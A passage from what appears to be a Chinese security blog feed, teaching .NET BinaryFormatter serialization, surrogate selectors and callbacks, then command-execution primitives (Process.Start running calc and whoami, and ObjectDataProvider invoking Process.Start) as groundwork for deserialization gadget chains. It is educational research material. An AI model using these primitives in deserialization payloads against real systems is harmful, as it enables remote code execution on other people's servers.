[<span class="meta">NonSerialized</span>] <span class="keyword">public</span> <span class="built_in">int</span> n2;</span><br><span class="line">        <span class="keyword">public</span> String str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">BinaryFormatterSerialize</span>(<span class="params"><span class="built_in">string</span> file, <span class="built_in">object</span> o</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            FileStream fileStream = <span class="keyword">new</span> FileStream(file, FileMode.Create, FileAccess.Write, FileShare.None);</span><br><span class="line">            binaryFormatter.Serialize(fileStream, o);</span><br><span class="line">            fileStream.Close();</span><br><span class="line">            Console.WriteLine(<span class="string">$&quot;serialize object <span class="subst">&#123;o&#125;</span> to file <span class="subst">&#123;file&#125;</span>.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">object</span> <span class="title">BinaryFormatterDeserialFromFile</span>(<span class="params"><span class="built_in">string</span> file</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            IFormatter formatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            Stream stream = <span class="keyword">new</span> FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read);</span><br><span class="line">            <span class="built_in">object</span> o = formatter.Deserialize(stream);</span><br><span class="line">            stream.Close();</span><br><span class="line">            <span class="keyword">return</span> o;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MyObject myObject = <span class="keyword">new</span> MyObject();</span><br><span class="line">                myObject.n1 = <span class="number">1</span>;</span><br><span class="line">                myObject.n2 = <span class="number">2</span>;</span><br><span class="line">                myObject.str = <span class="string">&quot;jack&quot;</span>;</span><br><span class="line"></span><br><span class="line">                BinaryFormatterSerialize(<span class="string">&quot;1.bin&quot;</span>, myObject);</span><br><span class="line">                MyObject myObject1 = (MyObject)BinaryFormatterDeserialFromFile(<span class="string">&quot;1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;n1:<span class="subst">&#123;myObject1.n1&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;NonSerialized n2:<span class="subst">&#123;myObject1.n2&#125;</span>&quot;</span>);</span><br><span class="line">                Console.WriteLine(<span class="string">$&quot;str:<span class="subst">&#123;myObject1.str&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.Message);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240221111317796.png" alt="image-20240221111317796"></p><p>反序列化结果</p><p>这个n2因为我们在代码中标注了这个 <code>[NonSerialized]</code>字段  所以并没有进行反序列化  所以既然结果是0</p><p><img src="../images/image-20240221111554855.png" alt="image-20240221111554855"></p><p>在.Net中   用的是using  并不是import  </p><p>这里的namespace相当于java的package   如果不用namespace{xxx}  这种格式的话  namespace  xxx;这种格式的也行</p><p><img src="../images/image-20240221111829134.png" alt="image-20240221111829134"></p><p>这样写其实也行   都是一个意思  反序列化的结果也是一样的</p><p><img src="../images/image-20240221112058974.png" alt="image-20240221112058974"></p><p>可以看到对象除了被标记不能被序列化的字段以外全部恢复到了原来的值。查看生成的bin文件，发现序列化之后的数据采用<code>0001 0000</code>开头</p><h2 id="Formatter"><a href="#Formatter" class="headerlink" title="Formatter"></a>Formatter</h2><p>在上述我们给出的例子中  我们使用的是BinaryFormatter类  这个类表示使用二进制的形式进行序列化  在dotnet中还有其他序列化的类   每个序列化的类都对应了一种序列化的格式</p><ol><li>BinaryFormatter 用于二进制格式</li><li>SoapFormatter 用于序列化soap格式</li><li>LosFormatter 用于序列化 Web 窗体页的视图状态</li><li>ObjectStateFormatter 用于序列化状态对象图</li><li>XmlSerializer 用于生成xml数据</li><li>JsonSerializer 用于生成Json数据</li></ol><p>这些类都有个共同点  就是都实现了名为IFormatter、IRemotingFormatter的接口  IRemotingFormatter是用来远程调用的RPC接口  他也实现了IFormatter接口  所以重点看IFormatter接口就行了</p><p><img src="../images/image-20240221112921545.png" alt="image-20240221112921545"></p><p>在.Net中  这个 <code>:</code>后面就是实现的接口   并且在其中这个sealed的意思是不可继承的意思  简单点就是说不能当父类</p><p>他里面的<code>internal</code>参数就是说不能被这个类以外的类调用到   (里面的内部类是可以访问的)</p><p><img src="../images/image-20240221113344537.png" alt="image-20240221113344537"></p><p>这个里面的get和set的意思是   就是说这个属性可以被getter方法获取到也可以被setter方法来赋值</p><p>通过这三个字段，我们可以控制序列化和反序列化时数据的类型、值以及其他信息。</p><p>这三个属性的含义</p><div class="table-container"><table><thead><tr><th>类 字段名</th><th>含义用途</th></tr></thead><tbody><tr><td>ISurrogateSelector SurrogateSelector</td><td>序列化代理选择器 接管formatter的序列化或反序列化处理</td></tr><tr><td>SerializationBinder Binder</td><td>用于控制在序列化和反序列化期间使用的实际类型</td></tr><tr><td>StreamingContext Context</td><td>序列化流上下文 其中states字段包含了序列化的来源和目的地</td></tr></tbody></table></div><h2 id="BinaryFormatter序列化的生命周期"><a href="#BinaryFormatter序列化的生命周期" class="headerlink" title="BinaryFormatter序列化的生命周期"></a>BinaryFormatter序列化的生命周期</h2><p><img src="../images/image-20210420105228965.png" alt="image-20210420105228965"></p><p>这个图是反序列化的流程图</p><p>当formatter调用Serialize方法的时候，会有以下的生命周期</p><ol><li>首先确定formatter是否有代理选择器，如果有则检查代理选择器要处理的对象类型是否和给定的对象类型一致，如果一致，代理选择器会调用<code>ISerializable.GetObjectData()</code>。</li><li>如果没有代理选择器，或者代理选择器不处理该对象类型，则检查对象是否有<code>[Serializable]</code>特性。如果不能序列化则抛出异常。</li><li>检查该对象是否实现ISerializable接口，如果实现就调用其GetObjectData方法。</li><li>如果没实现ISerializable接口就使用默认的序列化策略，序列化所以没标记<code>[NonSerialized]</code>的字段。</li></ol><p>而在序列化和反序列化的过程中还有四个回调事件</p><div class="table-container"><table><thead><tr><th>特性</th><th>调用关联的方法时</th><th>典型用法</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializingattribute">OnDeserializingAttribute</a></td><td>反序列化之前</td><td>初始化可选字段的默认值。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.ondeserializedattribute">OnDeserializedAttribute</a></td><td>反序列化之后</td><td>根据其他字段的内容修改可选字段值。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializingattribute">OnSerializingAttribute</a></td><td>序列化之前</td><td>准备序列化。 例如，创建可选数据结构。</td></tr><tr><td><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.onserializedattribute">OnSerializedAttribute</a></td><td>序列化之后</td><td>记录序列化事件。</td></tr></tbody></table></div><h3 id="01-代理器"><a href="#01-代理器" class="headerlink" title="01-代理器"></a>01-代理器</h3><p>示例代码</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Permissions;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ConsoleApplication1</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyObject</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> str &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyObject</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MyObject</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;MyObject(SerializationInfo info, StreamingContext context)&quot;</span>);</span><br><span class="line">            str = info.GetString(<span class="string">&quot;str&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.SerializationFormatter)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetObjectData of MyObject.class&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;str&quot;</span>, str, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">OnDeserializing</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserializing</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnDeserializing&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnDeserialized</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnDeserialized</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnDeserialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnSerializing</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerializing</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnSerializing&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="meta">OnSerialized</span>]</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">TestOnSerialized</span>(<span class="params">StreamingContext sc</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;TestOnSerialized&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">MySerializationSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            info.AddValue(<span class="string">&quot;str&quot;</span>, ((MyObject)obj).str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;SetObjectData of ISerializationSurrogate&quot;</span>);</span><br><span class="line">            MyObject m = <span class="keyword">new</span> MyObject();</span><br><span class="line">            m.str = (<span class="built_in">string</span>)info.GetValue(<span class="string">&quot;str&quot;</span>, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MyObject myObject = <span class="keyword">new</span> MyObject();</span><br><span class="line">                myObject.str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">using</span> (MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 构建formatter</span></span><br><span class="line">                    BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 设置序列化代理选择器</span></span><br><span class="line">                    SurrogateSelector ss = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">                    ss.AddSurrogate(<span class="keyword">typeof</span>(MyObject), binaryFormatter.Context, <span class="keyword">new</span> MySerializationSurrogate());</span><br><span class="line">                    <span class="comment">// 赋值给formatter 这里是否设置代理选择器决定了序列化的生命周期</span></span><br><span class="line">                    binaryFormatter.SurrogateSelector = ss;</span><br><span class="line">                    <span class="comment">// 序列化</span></span><br><span class="line">                    binaryFormatter.Serialize(memoryStream, myObject);</span><br><span class="line">                    <span class="comment">// 重置stream</span></span><br><span class="line">                    memoryStream.Position = <span class="number">0</span>;</span><br><span class="line">                    myObject = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 反序列化</span></span><br><span class="line">                    myObject = (MyObject)binaryFormatter.Deserialize(memoryStream);</span><br><span class="line">                    Console.WriteLine(myObject.str);    <span class="comment">// hello</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(e.StackTrace);</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实重点就在这个代理器(<code>MySerializationSurrogate</code>)和这个序列化接口(<code>ISerializable</code>)  这个序列化的生命周期与这两个有关</p><p>这是一个使用了SurrogateSelector代理选择器的序列化例子，输出如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">GetObjectData of ISerializationSurrogate</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">SetObjectData of ISerializationSurrogate</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">//------------------</span><br><span class="line"></span><br><span class="line">OnDeserializing方法（序列化开始）</span><br><span class="line">代理器的GetObjectData，获取属性</span><br><span class="line">OnSerialized方法（序列化结束）</span><br><span class="line">OnDeserializing（反序列化开始）</span><br><span class="line">代理器的SetObjectData，设置属性</span><br><span class="line">OnDeserialized（反序列化结束）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="02-非代理器和ISerializable模式"><a href="#02-非代理器和ISerializable模式" class="headerlink" title="02-非代理器和ISerializable模式"></a>02-非代理器和ISerializable模式</h3><p>优先级是这个代理器  当代理器没有进行设置的时候   就会顺着去看<code>ISerializable</code>模式</p><p><img src="../images/image-20240222162839601.png" alt="image-20240222162839601"></p><p>将这里注释掉   就是不设置代理器  其输出是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">GetObjectData of MyObject.class</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">MyObject(SerializationInfo info, StreamingContext context)</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//----------------------</span><br><span class="line"></span><br><span class="line">OnSerializing（序列化开始）</span><br><span class="line">由于实现了ISerializable接口，因此会调用本身的GetObjectData方法</span><br><span class="line">OnSerialized（序列化结束）</span><br><span class="line">OnDeserializing（反序列化开始）</span><br><span class="line">类的实例化。protected MyObject(SerializationInfo info, StreamingContext context)，在反序列化时由于实现了ISerializable接口，因此会调用构造方法，这个也是必须要加的，假如不加的话会报错</span><br><span class="line">OnDeserialized（反序列化结束）</span><br></pre></td></tr></table></figure><h2 id="03-非代理器和非ISerializable模式"><a href="#03-非代理器和非ISerializable模式" class="headerlink" title="03-非代理器和非ISerializable模式"></a>03-非代理器和非ISerializable模式</h2><p>将ISerializable接口给除去  输出结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TestOnSerializing</span><br><span class="line">TestOnSerialized</span><br><span class="line">TestOnDeserializing</span><br><span class="line">TestOnDeserialized</span><br><span class="line">hello</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是单纯的4个回调模式了  </p><h2 id="04-SerializationInfo"><a href="#04-SerializationInfo" class="headerlink" title="04-SerializationInfo"></a>04-SerializationInfo</h2><p>MyObject的构造函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//实现了ISerializable接口的类必须包含有序列化构造函数，否则会出错。</span><br><span class="line">protected MyObject(SerializationInfo info, StreamingContext context)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(&quot;MyObject(SerializationInfo info, StreamingContext context)&quot;);</span><br><span class="line">    str = info.GetString(&quot;str&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进SerializationInfo这个类中</p><p><img src="../images/image-20240222163800688.png" alt="image-20240222163800688"></p><p>SerializationInfo <strong>info变量中表示序列化流的信息</strong>，对象的类型和值都存储在其中，查看类定义</p><p>可见其存储了对象类型、成员个数、程序集名称、类型名称等，还有一些AddValue的重载用于添加类实例字段变量键值对</p><p>(为什么我们要做这个构造函数？   里面给的东西其实和代理器的代码是差不多的  跟进这个我们构造的代理器)</p><p><img src="../images/image-20240222164049951.png" alt="image-20240222164049951"></p><p>在我们构造的代理器其中的Get和Set方法  其实这个Get对应的就是我们继承的ISerializable接口下的Get方法  然后这个Set对应就是我们反序列化类的构造函数  (这里就是为什么用这个SerializationInfo类的原因   里面的函数方法是类似的)</p><h2 id="命令执行-01"><a href="#命令执行-01" class="headerlink" title="命令执行-01"></a>命令执行-01</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1;</span><br><span class="line"></span><br><span class="line">public class Command</span><br><span class="line">&#123;</span><br><span class="line">    public static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        var start = Process.Start(&quot;cmd.exe&quot;, &quot;/c calc&quot;);</span><br><span class="line">        // var process = new Process();</span><br><span class="line">        // process.StartInfo.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">        // process.StartInfo.Arguments = &quot;/c calc&quot;;</span><br><span class="line">        // process.Start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似java的runtime   在Start函数中   有两个关键的参数  就是这个FileName和Arguments</p><p><img src="../images/image-20240222170519803.png" alt="image-20240222170519803"></p><p>其运行的时候会先弹出cmd窗口  然后再执行calc  执行完后在关闭这个cmd窗口  并且这里也是没有回显的  接下来就解决这几个问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApplication1;</span><br><span class="line"></span><br><span class="line">public class Command</span><br><span class="line">&#123;</span><br><span class="line">    public static void Main(string[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        var process = new Process();</span><br><span class="line">        process.StartInfo.FileName = &quot;cmd.exe&quot;;</span><br><span class="line">        process.StartInfo.Arguments = &quot;/c whoami&quot;;</span><br><span class="line">        process.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        process.StartInfo.UseShellExecute = false;</span><br><span class="line">        process.Start();</span><br><span class="line">        var processStandardOutput = process.StandardOutput.ReadToEnd();</span><br><span class="line">        Console.WriteLine(processStandardOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240222170918255.png" alt="image-20240222170918255"></p><p>这样的话cmd窗口就不会弹出  回显也有了</p><p>其中RedirectStandardOutput和UseShellExecute需要注意一下</p><blockquote><ul><li>RedirectStandardOutput：<ul><li>当设置为 true 时，表示重定向标准输出流，即将进程的标准输出流（通常是在控制台窗口中显示的信息）连接到 Process.StandardOutput 流中，以便你的程序可以读取进程的输出。</li></ul></li><li>UseShellExecute：<ul><li>当设置为 false 时，表示不使用操作系统的 shell 启动进程。相反，它允许你直接启动可执行文件，命令行等，而不需要借助 shell。(不弹出cmd窗口的关键)</li></ul></li></ul></blockquote><h2 id="命令执行-02"><a href="#命令执行-02" class="headerlink" title="命令执行-02"></a>命令执行-02</h2><p>ObjectDataProvider  这个类也是可以进行命令执行的   其实最终也是调用到这个Process类才能执行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">WpfApplication2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Command</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> objectDataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">        objectDataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">        objectDataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">        objectDataProvider.MethodParameters.Add(<span class="string">&quot;/c calc&quot;</span>);</span><br><span class="line">        objectDataProvider.ObjectInstance = <span class="keyword">new</span> Process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建项目的时候要选择wpf</p><p>接下来分析一下是怎么样能命令执行的</p><p><img src="../images/image-20240223100109274.png" alt="image-20240223100109274"></p><p>跟进ObjectDataProvider类ObjectInstance方法中</p><p><img src="../images/image-20240223100208142.png" alt="image-20240223100208142"></p><p>跟进Refresh方法中</p><p><img src="../images/image-20240223100248546.png" alt="image-20240223100248546"></p><p>跟进到这个QueryWorker方法中</p><p><img src="../images/image-20240223100321621.png" alt="image-20240223100321621"></p><p>在这个方法中  就会一直循环来给我们刚开始传入的值进行赋值</p><p><img src="../images/image-20240223100529141.png" alt="image-20240223100529141"></p><p>然后跟进这个方法中  </p><p><img src="../images/image-20240223100557318.png" alt="image-20240223100557318"></p><p>这里就获取到了Process类了</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2024/02/02/%E3%80%90.NET%20%E5%AE%89%E5%85%A8%E3%80%91ASP.NET%20Deserialization%2001/#04-%E5%BA%8F%E5%88%97</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2024-Web部分</title>
    <link href="https://ke1nys.github.io/posts/2e351f8.html"/>
    <id>https://ke1nys.github.io/posts/2e351f8.html</id>
    <published>2024-02-01T08:05:33.000Z</published>
    <updated>2024-02-24T13:59:43.491Z</updated>
    
